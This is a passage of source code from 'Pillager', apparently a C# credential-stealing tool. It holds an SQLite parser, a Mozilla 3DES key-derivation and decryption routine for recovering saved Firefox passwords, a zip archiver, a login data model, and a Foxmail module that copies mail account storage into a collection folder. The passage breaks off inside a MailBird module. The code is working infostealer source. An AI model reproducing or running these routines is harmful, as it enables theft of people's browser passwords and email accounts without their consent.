                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 13L) / 2.0);
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = SQLDataTypeSize[(int)_fieldArray[j].type];
                        }

                        num10 = num10 + (num8 - endIndex) + 1L;
                    }

                    table_entries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                                {

                                    byte[] bytes = new byte[_fieldArray[k].size];
                                    Array.Copy(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), bytes, 0, _fieldArray[k].size);

                                    table_entries[length + i].content[k] = Convert.ToBase64String(bytes);
                                }
                                else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.Unicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                    Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            int t = Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4)));
                            table_entries[length + i].content[k] = Convert.ToString(ConvertToInteger(t,
                                (int)_fieldArray[k].size));
                        }

                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(page_size))));
                }

                ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public readonly string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}

```

`Pillager/Helper/TripleDESHelper.cs`:

```cs
using System.IO;
using System.Security.Cryptography;

// Adapted from firepwd.net (https://github.com/gourk/FirePwd.Net)

namespace Pillager.Helper
{
    public class TripleDESHelper
    {
        public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
        {
            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }

            }
        }

        public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
        {
            byte[] decrypted = new byte[512];

            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(decrypted, 0, decrypted.Length);
                    }
                }

            }

            return decrypted;
        }
    }
}

```

`Pillager/Helper/ZipStorer.cs`:

```cs
// ZipStorer, by Jaime Olivares
// Website: http://github.com/jaime-olivares/zipstorer
// Version: 3.5.0 (May 20, 2019)

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace Pillager.Helper
{
    /// <summary>
    /// Unique class for compression/decompression file. Represents a Zip file.
    /// </summary>
    public class ZipStorer : IDisposable
    {
        /// <summary>
        /// Compression method enumeration
        /// </summary>
        public enum Compression : ushort
        {
            /// <summary>Uncompressed storage</summary> 
            Store = 0,
            /// <summary>Deflate compression method</summary>
            Deflate = 8
        }

        /// <summary>
        /// Represents an entry in Zip file directory
        /// </summary>
        public class ZipFileEntry
        {
            /// <summary>Compression method</summary>
            public Compression Method;
            /// <summary>Full path and filename as stored in Zip</summary>
            public string FilenameInZip;
            /// <summary>Original file size</summary>
            public uint FileSize;
            /// <summary>Compressed file size</summary>
            public uint CompressedSize;
            /// <summary>Offset of header information inside Zip storage</summary>
            public uint HeaderOffset;
            /// <summary>Offset of file inside Zip storage</summary>
            public uint FileOffset;
            /// <summary>Size of header information</summary>
            public uint HeaderSize;
            /// <summary>32-bit checksum of entire file</summary>
            public uint Crc32;
            /// <summary>Last modification time of file</summary>
            public DateTime ModifyTime;
            /// <summary>Creation time of file</summary>
            public DateTime CreationTime;
            /// <summary>Last access time of file</summary>
            public DateTime AccessTime;
            /// <summary>User comment for file</summary>
            public string Comment;
            /// <summary>True if UTF8 encoding for filename and comments, false if default (CP 437)</summary>
            public bool EncodeUTF8;

            /// <summary>Overriden method</summary>
            /// <returns>Filename in Zip</returns>
            public override string ToString()
            {
                return FilenameInZip;
            }
        }

        #region Public fields
        /// <summary>True if UTF8 encoding for filename and comments, false if default (CP 437)</summary>
        public bool EncodeUTF8 = true;
        /// <summary>Force deflate algotithm even if it inflates the stored file. Off by default.</summary>
        public bool ForceDeflating = false;
        #endregion

        #region Private fields
        // List of files to store
        private List<ZipFileEntry> Files = new List<ZipFileEntry>();
        // Filename of storage file
        private string FileName;
        // Stream object of storage file
        private Stream ZipFileStream;
        // General comment
        private string Comment = string.Empty;
        // Central dir image
        private byte[] CentralDirImage;
        // Existing files in zip
        private ushort ExistingFiles;
        // File access for Open method
        private FileAccess Access;
        // leave the stream open after the ZipStorer object is disposed
        private bool leaveOpen;
        // Static CRC32 Table
        private static uint[] CrcTable;
        // Default filename encoder
        private static Encoding DefaultEncoding = Encoding.GetEncoding(437);
        #endregion

        #region Public methods
        // Static constructor. Just invoked once in order to create the CRC32 lookup table.
        static ZipStorer()
        {
            // Generate CRC32 table
            CrcTable = new uint[256];
            for (int i = 0; i < CrcTable.Length; i++)
            {
                uint c = (uint)i;
                for (int j = 0; j < 8; j++)
                {
                    if ((c & 1) != 0)
                        c = 3988292384 ^ (c >> 1);
                    else
                        c >>= 1;
                }
                CrcTable[i] = c;
            }
        }
        /// <summary>
        /// Method to create a new storage file
        /// </summary>
        /// <param name="_filename">Full path of Zip file to create</param>
        /// <param name="_comment">General comment for Zip file</param>
        /// <returns>A valid ZipStorer object</returns>
        public static ZipStorer Create(string _filename, string _comment = null)
        {
            Stream stream = new FileStream(_filename, FileMode.Create, FileAccess.ReadWrite);

            ZipStorer zip = Create(stream, _comment);
            zip.Comment = _comment ?? string.Empty;
            zip.FileName = _filename;

            return zip;
        }
        /// <summary>
        /// Method to create a new zip storage in a stream
        /// </summary>
        /// <param name="_stream"></param>
        /// <param name="_comment"></param>
        /// <param name="_leaveOpen">true to leave the stream open after the ZipStorer object is disposed; otherwise, false (default).</param>
        /// <returns>A valid ZipStorer object</returns>
        public static ZipStorer Create(Stream _stream, string _comment = null, bool _leaveOpen = false)
        {
            ZipStorer zip = new ZipStorer();
            zip.Comment = _comment ?? string.Empty;
            zip.ZipFileStream = _stream;
            zip.Access = FileAccess.Write;
            zip.leaveOpen = _leaveOpen;
            return zip;
        }
        /// <summary>
        /// Add full contents of a file into the Zip storage
        /// </summary>
        /// <param name="_method">Compression method</param>
        /// <param name="_pathname">Full path of file to add to Zip storage</param>
        /// <param name="_filenameInZip">Filename and path as desired in Zip directory</param>
        /// <param name="_comment">Comment for stored file</param>        
        public ZipFileEntry AddFile(Compression _method, string _pathname, string _filenameInZip, string _comment = null)
        {
            if (Access == FileAccess.Read)
                throw new InvalidOperationException("Writing is not alowed");

            using (var stream = new FileStream(_pathname, FileMode.Open, FileAccess.Read))
            {
                return AddStream(_method, _filenameInZip, stream, File.GetLastWriteTime(_pathname), _comment);
            }
        }
        /// <summary>
        /// Add full contents of a stream into the Zip storage
        /// </summary>
        /// <remarks>Same parameters and return value as AddStreamAsync()</remarks>
        public ZipFileEntry AddStream(Compression _method, string _filenameInZip, Stream _source, DateTime _modTime, string _comment = null)
        {
            return AddStreamAsync(_method, _filenameInZip, _source, _modTime, _comment);
        }
        /// <summary>
        /// Add full contents of a stream into the Zip storage
        /// </summary>
        /// <param name="_method">Compression method</param>
        /// <param name="_filenameInZip">Filename and path as desired in Zip directory</param>
        /// <param name="_source">Stream object containing the data to store in Zip</param>
        /// <param name="_modTime">Modification time of the data to store</param>
        /// <param name="_comment">Comment for stored file</param>
        public ZipFileEntry AddStreamAsync(Compression _method, string _filenameInZip, Stream _source, DateTime _modTime, string _comment = null)
        {
            if (Access == FileAccess.Read)
                throw new InvalidOperationException("Writing is not alowed");

            // Prepare the fileinfo
            ZipFileEntry zfe = new ZipFileEntry
            {
                Method = _method,
                EncodeUTF8 = EncodeUTF8,
                FilenameInZip = NormalizedFilename(_filenameInZip),
                Comment = _comment ?? string.Empty,
                // Even though we write the header now, it will have to be rewritten, since we don't know compressed size or crc.
                Crc32 = 0, // to be updated later
                HeaderOffset = (uint)ZipFileStream.Position, // offset within file of the start of this local record
                CreationTime = _modTime,
                ModifyTime = _modTime,
                AccessTime = _modTime
            };

            // Write local header
            WriteLocalHeader(zfe);
            zfe.FileOffset = (uint)ZipFileStream.Position;

            // Write file to zip (store)
            Store(zfe, _source);

            _source.Close();

            UpdateCrcAndSizes(zfe);

            Files.Add(zfe);
            return zfe;
        }
        /// <summary>
        /// Add full contents of a directory into the Zip storage
        /// </summary>
        /// <param name="_method">Compression method</param>
        /// <param name="_pathname">Full path of directory to add to Zip storage</param>
        /// <param name="_pathnameInZip">Path name as desired in Zip directory</param>
        /// <param name="_comment">Comment for stored directory</param>
        public void AddDirectory(Compression _method, string _pathname, string _pathnameInZip, string _comment = null)
        {
            if (Access == FileAccess.Read)
                throw new InvalidOperationException("Writing is not allowed");

            string foldername;
            int pos = _pathname.LastIndexOf(Path.DirectorySeparatorChar);
            string separator = Path.DirectorySeparatorChar.ToString();
            foldername = pos >= 0 ? _pathname.Remove(0, pos + 1) : _pathname;

            if (_pathnameInZip != null && _pathnameInZip != "")
                foldername = _pathnameInZip + foldername;

            if (!foldername.EndsWith(separator, StringComparison.CurrentCulture))
                foldername = foldername + separator;

            //AddStream(_method, foldername, null/* TODO Change to default(_) if this is not a reference type */, File.GetLastWriteTime(_pathname), _comment);

            // Process the list of files found in the directory.
            string[] fileEntries = Directory.GetFiles(_pathname);
            foreach (string fileName in fileEntries)
                AddFile(_method, fileName, foldername + Path.GetFileName(fileName), "");

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(_pathname);
            foreach (string subdirectory in subdirectoryEntries)
                AddDirectory(_method, subdirectory, foldername, "");
        }
        /// <summary>
        /// Updates central directory (if pertinent) and close the Zip storage
        /// </summary>
        /// <remarks>This is a required step, unless automatic dispose is used</remarks>
        public void Close()
        {
            if (Access != FileAccess.Read)
            {
                uint centralOffset = (uint)ZipFileStream.Position;
                uint centralSize = 0;

                if (CentralDirImage != null)
                    ZipFileStream.Write(CentralDirImage, 0, CentralDirImage.Length);

                foreach (var t in Files)
                {
                    long pos = ZipFileStream.Position;
                    WriteCentralDirRecord(t);
                    centralSize += (uint)(ZipFileStream.Position - pos);
                }

                if (CentralDirImage != null)
                    WriteEndRecord(centralSize + (uint)CentralDirImage.Length, centralOffset);
                else
                    WriteEndRecord(centralSize, centralOffset);
            }

            if (ZipFileStream != null && !leaveOpen)
            {
                ZipFileStream.Flush();
                ZipFileStream.Dispose();
                ZipFileStream = null;
            }
        }
        #endregion

        #region Private methods
        /* Local file header:
            local file header signature     4 bytes  (0x04034b50)
            version needed to extract       2 bytes
            general purpose bit flag        2 bytes
            compression method              2 bytes
            last mod file time              2 bytes
            last mod file date              2 bytes
            crc-32                          4 bytes
            compressed size                 4 bytes
            uncompressed size               4 bytes
            filename length                 2 bytes
            extra field length              2 bytes

            filename (variable size)
            extra field (variable size)
        */
        private void WriteLocalHeader(ZipFileEntry _zfe)
        {
            long pos = ZipFileStream.Position;
            Encoding encoder = _zfe.EncodeUTF8 ? Encoding.UTF8 : DefaultEncoding;
            byte[] encodedFilename = encoder.GetBytes(_zfe.FilenameInZip);
            byte[] extraInfo = CreateExtraInfo(_zfe);

            ZipFileStream.Write(new byte[] { 80, 75, 3, 4, 20, 0 }, 0, 6); // No extra header
            ZipFileStream.Write(BitConverter.GetBytes((ushort)(_zfe.EncodeUTF8 ? 0x0800 : 0)), 0, 2); // filename and comment encoding 
            ZipFileStream.Write(BitConverter.GetBytes((ushort)_zfe.Method), 0, 2);  // zipping method
            ZipFileStream.Write(BitConverter.GetBytes(DateTimeToDosTime(_zfe.ModifyTime)), 0, 4); // zipping date and time
            ZipFileStream.Write(new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, 0, 12); // unused CRC, un/compressed size, updated later
            ZipFileStream.Write(BitConverter.GetBytes((ushort)encodedFilename.Length), 0, 2); // filename length
            ZipFileStream.Write(BitConverter.GetBytes((ushort)extraInfo.Length), 0, 2); // extra length

            ZipFileStream.Write(encodedFilename, 0, encodedFilename.Length);
            ZipFileStream.Write(extraInfo, 0, extraInfo.Length);
            _zfe.HeaderSize = (uint)(ZipFileStream.Position - pos);
        }
        /* Central directory's File header:
            central file header signature   4 bytes  (0x02014b50)
            version made by                 2 bytes
            version needed to extract       2 bytes
            general purpose bit flag        2 bytes
            compression method              2 bytes
            last mod file time              2 bytes
            last mod file date              2 bytes
            crc-32                          4 bytes
            compressed size                 4 bytes
            uncompressed size               4 bytes
            filename length                 2 bytes
            extra field length              2 bytes
            file comment length             2 bytes
            disk number start               2 bytes
            internal file attributes        2 bytes
            external file attributes        4 bytes
            relative offset of local header 4 bytes

            filename (variable size)
            extra field (variable size)
            file comment (variable size)
        */
        private void WriteCentralDirRecord(ZipFileEntry _zfe)
        {
            Encoding encoder = _zfe.EncodeUTF8 ? Encoding.UTF8 : DefaultEncoding;
            byte[] encodedFilename = encoder.GetBytes(_zfe.FilenameInZip);
            byte[] encodedComment = encoder.GetBytes(_zfe.Comment);
            byte[] extraInfo = CreateExtraInfo(_zfe);

            ZipFileStream.Write(new byte[] { 80, 75, 1, 2, 23, 0xB, 20, 0 }, 0, 8);
            ZipFileStream.Write(BitConverter.GetBytes((ushort)(_zfe.EncodeUTF8 ? 0x0800 : 0)), 0, 2); // filename and comment encoding 
            ZipFileStream.Write(BitConverter.GetBytes((ushort)_zfe.Method), 0, 2);  // zipping method
            ZipFileStream.Write(BitConverter.GetBytes(DateTimeToDosTime(_zfe.ModifyTime)), 0, 4);  // zipping date and time
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.Crc32), 0, 4); // file CRC
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.CompressedSize), 0, 4); // compressed file size
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.FileSize), 0, 4); // uncompressed file size
            ZipFileStream.Write(BitConverter.GetBytes((ushort)encodedFilename.Length), 0, 2); // Filename in zip
            ZipFileStream.Write(BitConverter.GetBytes((ushort)extraInfo.Length), 0, 2); // extra length
            ZipFileStream.Write(BitConverter.GetBytes((ushort)encodedComment.Length), 0, 2);

            ZipFileStream.Write(BitConverter.GetBytes((ushort)0), 0, 2); // disk=0
            ZipFileStream.Write(BitConverter.GetBytes((ushort)0), 0, 2); // file type: binary
            ZipFileStream.Write(BitConverter.GetBytes((ushort)0), 0, 2); // Internal file attributes
            ZipFileStream.Write(BitConverter.GetBytes((ushort)0x8100), 0, 2); // External file attributes (normal/readable)
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.HeaderOffset), 0, 4);  // Offset of header

            ZipFileStream.Write(encodedFilename, 0, encodedFilename.Length);
            ZipFileStream.Write(extraInfo, 0, extraInfo.Length);
            ZipFileStream.Write(encodedComment, 0, encodedComment.Length);
        }
        /* End of central dir record:
            end of central dir signature    4 bytes  (0x06054b50)
            number of this disk             2 bytes
            number of the disk with the
            start of the central directory  2 bytes
            total number of entries in
            the central dir on this disk    2 bytes
            total number of entries in
            the central dir                 2 bytes
            size of the central directory   4 bytes
            offset of start of central
            directory with respect to
            the starting disk number        4 bytes
            zipfile comment length          2 bytes
            zipfile comment (variable size)
        */
        private void WriteEndRecord(uint _size, uint _offset)
        {
            Encoding encoder = EncodeUTF8 ? Encoding.UTF8 : DefaultEncoding;
            byte[] encodedComment = encoder.GetBytes(Comment);

            ZipFileStream.Write(new byte[] { 80, 75, 5, 6, 0, 0, 0, 0 }, 0, 8);
            ZipFileStream.Write(BitConverter.GetBytes((ushort)Files.Count + ExistingFiles), 0, 2);
            ZipFileStream.Write(BitConverter.GetBytes((ushort)Files.Count + ExistingFiles), 0, 2);
            ZipFileStream.Write(BitConverter.GetBytes(_size), 0, 4);
            ZipFileStream.Write(BitConverter.GetBytes(_offset), 0, 4);
            ZipFileStream.Write(BitConverter.GetBytes((ushort)encodedComment.Length), 0, 2);
            ZipFileStream.Write(encodedComment, 0, encodedComment.Length);
        }
        // Copies all source file into storage file
        private Compression Store(ZipFileEntry _zfe, Stream _source)
        {
            byte[] buffer = new byte[16384];
            int bytesRead;
            uint totalRead = 0;
            Stream outStream;

            long posStart = ZipFileStream.Position;
            long sourceStart = _source.CanSeek ? _source.Position : 0;

            outStream = _zfe.Method == Compression.Store ? ZipFileStream : new DeflateStream(ZipFileStream, CompressionMode.Compress, true);

            _zfe.Crc32 = 0 ^ 0xffffffff;

            do
            {
                bytesRead = _source.Read(buffer, 0, buffer.Length);

                totalRead += (uint)bytesRead;
                if (bytesRead > 0)
                {
                    outStream.Write(buffer, 0, bytesRead);

                    for (uint i = 0; i < bytesRead; i++)
                    {
                        _zfe.Crc32 = CrcTable[(_zfe.Crc32 ^ buffer[i]) & 0xFF] ^ (_zfe.Crc32 >> 8);
                    }
                }
            } while (bytesRead > 0);
            outStream.Flush();

            if (_zfe.Method == Compression.Deflate)
                outStream.Dispose();

            _zfe.Crc32 ^= 0xffffffff;
            _zfe.FileSize = totalRead;
            _zfe.CompressedSize = (uint)(ZipFileStream.Position - posStart);

            // Verify for real compression
            if (_zfe.Method == Compression.Deflate && !ForceDeflating && _source.CanSeek && _zfe.CompressedSize > _zfe.FileSize)
            {
                // Start operation again with Store algorithm
                _zfe.Method = Compression.Store;
                ZipFileStream.Position = posStart;
                ZipFileStream.SetLength(posStart);
                _source.Position = sourceStart;

                return Store(_zfe, _source);
            }

            return _zfe.Method;
        }
        /* DOS Date and time:
            MS-DOS date. The date is a packed value with the following format. Bits Description 
                0-4 Day of the month (131) 
                5-8 Month (1 = January, 2 = February, and so on) 
                9-15 Year offset from 1980 (add 1980 to get actual year) 
            MS-DOS time. The time is a packed value with the following format. Bits Description 
                0-4 Second divided by 2 
                5-10 Minute (059) 
                11-15 Hour (023 on a 24-hour clock) 
        */
        private uint DateTimeToDosTime(DateTime _dt)
        {
            return (uint)(
                (_dt.Second / 2) | (_dt.Minute << 5) | (_dt.Hour << 11) |
                (_dt.Day << 16) | (_dt.Month << 21) | ((_dt.Year - 1980) << 25));
        }
        private byte[] CreateExtraInfo(ZipFileEntry _zfe)
        {
            byte[] buffer = new byte[36];
            BitConverter.GetBytes((ushort)0x000A).CopyTo(buffer, 0); // NTFS FileTime
            BitConverter.GetBytes((ushort)32).CopyTo(buffer, 2); // Length
            BitConverter.GetBytes((ushort)1).CopyTo(buffer, 8); // Tag 1
            BitConverter.GetBytes((ushort)24).CopyTo(buffer, 10); // Size 1
            BitConverter.GetBytes(_zfe.ModifyTime.ToFileTime()).CopyTo(buffer, 12); // MTime
            BitConverter.GetBytes(_zfe.AccessTime.ToFileTime()).CopyTo(buffer, 20); // ATime
            BitConverter.GetBytes(_zfe.CreationTime.ToFileTime()).CopyTo(buffer, 28); // CTime

            return buffer;
        }

        /* CRC32 algorithm
          The 'magic number' for the CRC is 0xdebb20e3.  
          The proper CRC pre and post conditioning is used, meaning that the CRC register is
          pre-conditioned with all ones (a starting value of 0xffffffff) and the value is post-conditioned by
          taking the one's complement of the CRC residual.
          If bit 3 of the general purpose flag is set, this field is set to zero in the local header and the correct
          value is put in the data descriptor and in the central directory.
        */
        private void UpdateCrcAndSizes(ZipFileEntry _zfe)
        {
            long lastPos = ZipFileStream.Position;  // remember position

            ZipFileStream.Position = _zfe.HeaderOffset + 8;
            ZipFileStream.Write(BitConverter.GetBytes((ushort)_zfe.Method), 0, 2);  // zipping method

            ZipFileStream.Position = _zfe.HeaderOffset + 14;
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.Crc32), 0, 4);  // Update CRC
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.CompressedSize), 0, 4);  // Compressed size
            ZipFileStream.Write(BitConverter.GetBytes(_zfe.FileSize), 0, 4);  // Uncompressed size

            ZipFileStream.Position = lastPos;  // restore position
        }
        // Replaces backslashes with slashes to store in zip header
        private string NormalizedFilename(string _filename)
        {
            string filename = _filename.Replace('\\', '/');

            int pos = filename.IndexOf(':');
            if (pos >= 0)
                filename = filename.Remove(0, pos + 1);

            return filename.Trim('/');
        }
        // Reads the end-of-central-directory record
        private bool ReadFileInfo()
        {
            if (ZipFileStream.Length < 22)
                return false;

            try
            {
                ZipFileStream.Seek(-17, SeekOrigin.End);
                BinaryReader br = new BinaryReader(ZipFileStream);
                do
                {
                    ZipFileStream.Seek(-5, SeekOrigin.Current);
                    uint sig = br.ReadUInt32();
                    if (sig == 0x06054b50)
                    {
                        ZipFileStream.Seek(6, SeekOrigin.Current);

                        ushort entries = br.ReadUInt16();
                        int centralSize = br.ReadInt32();
                        uint centralDirOffset = br.ReadUInt32();
                        ushort commentSize = br.ReadUInt16();

                        // check if comment field is the very last data in file
                        if (ZipFileStream.Position + commentSize != ZipFileStream.Length)
                            return false;

                        // Copy entire central directory to a memory buffer
                        ExistingFiles = entries;
                        CentralDirImage = new byte[centralSize];
                        ZipFileStream.Seek(centralDirOffset, SeekOrigin.Begin);
                        ZipFileStream.Read(CentralDirImage, 0, centralSize);

                        // Leave the pointer at the begining of central dir, to append new files
                        ZipFileStream.Seek(centralDirOffset, SeekOrigin.Begin);
                        return true;
                    }
                } while (ZipFileStream.Position > 0);
            }
            catch { }

            return false;
        }
        #endregion

        #region IDisposable Members
        /// <summary>
        /// Closes the Zip file stream
        /// </summary>
        public void Dispose()
        {
            Close();
        }
        #endregion
    }
}
```

`Pillager/Helper/decryptMoz3DES.cs`:

```cs
using System;
using System.Security.Cryptography;

namespace Pillager.Helper
{
    // Adapted from firepwd.net (https://github.com/gourk/FirePwd.Net)
    public class decryptMoz3DES
    {
        private byte[] cipherText { get; set; }
        private byte[] GlobalSalt { get; set; }
        private byte[] MasterPassword { get; set; }
        private byte[] EntrySalt { get; set; }
        public byte[] Key { get; private set; }
        public byte[] IV { get; private set; }

        public decryptMoz3DES(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
        {
            this.cipherText = cipherText;
            this.GlobalSalt = GlobalSalt;
            this.MasterPassword = MasterPassword;
            this.EntrySalt = EntrySalt;
        }

        public byte[] Compute()
        {
            byte[] k1;
            byte[] tk;
            byte[] k2;

            // GLMP
            var GLMP = new byte[GlobalSalt.Length + MasterPassword.Length]; // GlobalSalt + MasterPassword
            Buffer.BlockCopy(GlobalSalt, 0, GLMP, 0, GlobalSalt.Length);
            Buffer.BlockCopy(MasterPassword, 0, GLMP, GlobalSalt.Length, MasterPassword.Length);

            // HP
            var HP = new SHA1Managed().ComputeHash(GLMP); // SHA1(GLMP)

            // HPES
            var HPES = new byte[HP.Length + EntrySalt.Length]; // HP + EntrySalt
            Buffer.BlockCopy(HP, 0, HPES, 0, HP.Length);
            Buffer.BlockCopy(EntrySalt, 0, HPES, EntrySalt.Length, HP.Length);

            // CHP
            var CHP = new SHA1Managed().ComputeHash(HPES); // SHA1(HPES)

            //PES
            var PES = new byte[20]; // EntrySalt completed to 20 bytes by zero
            Array.Copy(EntrySalt, 0, PES, 0, EntrySalt.Length);
            for (int i = EntrySalt.Length; i < 20; i++)
            {
                PES[i] = 0;
            }

            // PESES
            var PESES = new byte[PES.Length + EntrySalt.Length]; // PES + EntrySalt
            Array.Copy(PES, 0, PESES, 0, PES.Length);
            Array.Copy(EntrySalt, 0, PESES, PES.Length, EntrySalt.Length);

            using (HMACSHA1 hmac = new HMACSHA1(CHP))
            {
                // k1
                k1 = hmac.ComputeHash(PESES);
                // tk
                tk = hmac.ComputeHash(PES);
                // tkES
                byte[] tkES = new byte[tk.Length + EntrySalt.Length];
                Buffer.BlockCopy(tk, 0, tkES, 0, tk.Length);
                Buffer.BlockCopy(EntrySalt, 0, tkES, tk.Length, EntrySalt.Length);
                // k2
                k2 = hmac.ComputeHash(tkES);
            }

            // k
            var k = new byte[k1.Length + k2.Length]; // final value conytaining key and iv
            Array.Copy(k1, 0, k, 0, k1.Length);
            Array.Copy(k2, 0, k, k1.Length, k2.Length);

            Key = new byte[24];

            for (int i = 0; i < Key.Length; i++)
            {
                Key[i] = k[i];
            }

            IV = new byte[8];
            int j = IV.Length - 1;

            for (int i = k.Length - 1; i >= k.Length - IV.Length; i--)
            {
                IV[j] = k[i];
                j--;
            }

            byte[] decryptedCiphertext = TripleDESHelper.DESCBCDecryptorByte(Key, IV, cipherText);

            // Trim decrypted password-check - we only need the first 24 bytes
            byte[] clearText = new byte[24];
            Array.Copy(decryptedCiphertext, clearText, clearText.Length);

            return clearText;
        }
    }
}
```

`Pillager/Helper/models.cs`:

```cs


// Adapted from SharpWeb (https://github.com/djhohnstein/SharpWeb)
namespace Pillager.Helper
{
    public class Login
    {
        public int id { get; set; }
        public string hostname { get; set; }
        public string httpRealm { get; set; }
        public string formSubmitURL { get; set; }
        public string usernameField { get; set; }
        public string passwordField { get; set; }
        public string encryptedUsername { get; set; }
        public string encryptedPassword { get; set; }
        public string guid { get; set; }
        public int encType { get; set; }
        public long timeCreated { get; set; }
        public long timeLastUsed { get; set; }
        public long timePasswordChanged { get; set; }
        public int timesUsed { get; set; }
        public string syncCounter { get; set; }
        public string everSynced { get; set; }
        public string encryptedUnknownFields { get; set; }
    }

}

```

`Pillager/Mails/Foxmail.cs`:

```cs
using System;
using System.IO;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Mails
{
    internal class Foxmail
    {
        public static string MailName = "Foxmail";

        public static string GetInstallPath()
        {
            try
            {
                string foxPath = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command")?.GetValue("").ToString();
                foxPath = foxPath?.Remove(foxPath.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "");
                return foxPath;
            }
            catch { return ""; }            
        }
        public static void Save(string path)
        {
            try
            {
                string installpath = GetInstallPath();
                if (!Directory.Exists(installpath) || !Directory.Exists(Path.Combine(installpath, "Storage"))) return;
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(installpath, "Storage"));
                foreach (var directory in directoryInfo.GetDirectories("Accounts", SearchOption.AllDirectories))
                {
                    Methods.CopyDirectory(directory.FullName, Path.Combine(savepath, Path.GetFileName(Path.GetDirectoryName(directory.FullName)) + "\\Accounts"), true);
                }
                if (File.Exists(Path.Combine(installpath, "FMStorage.list"))) File.Copy(Path.Combine(installpath, "FMStorage.list"), Path.Combine(savepath, "FMStorage.list"));
            }
            catch { }
        }
    }
}

```

`Pillager/Mails/MailBird.cs`:

```cs
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Mails
{
    internal class MailBird
    {
        public static string MailName = "MailBird";

